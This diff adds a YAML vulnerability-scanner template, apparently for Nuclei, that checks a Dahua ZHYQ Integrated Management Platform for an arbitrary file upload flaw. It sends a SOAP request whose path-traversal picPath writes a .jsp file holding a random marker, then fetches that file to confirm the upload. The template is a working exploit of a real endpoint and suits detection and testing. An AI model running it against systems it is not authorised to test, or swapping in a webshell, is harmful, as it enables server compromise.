@@ -1,0 +1,55 @@
+id: dahua-zhyq-integrated-management-platform-bitmap-anyfile-upload
+info:
+  name: Dahua ZHYQ Integrated Management Platform Bitmap Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Exploits an arbitrary file upload vulnerability in Dahua ZHYQ Integrated Management Platform.
+
+variables:
+  t1: "{{base64(rand_text_alphanumeric(4))}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - id: upload-bitmap-file
+    method: POST
+    path:
+      - "{{BaseURL}}/emap/webservice/gis/soap/bitmap"
+    headers:
+      Content-Type: text/xml;charset=UTF-8
+    body: |
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
+      <soapenv:Header/>           
+        <soapenv:Body>
+                 <res:uploadPicFile>
+                    <arg0>
+                     <picPath>/../{{t1}}.jsp</picPath>
+                    </arg0>
+                    <arg1>{{t2}}</arg1>
+                </res:uploadPicFile>
+        </soapenv:Body>
+      </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<code>1</code>"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/upload/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t1}}"
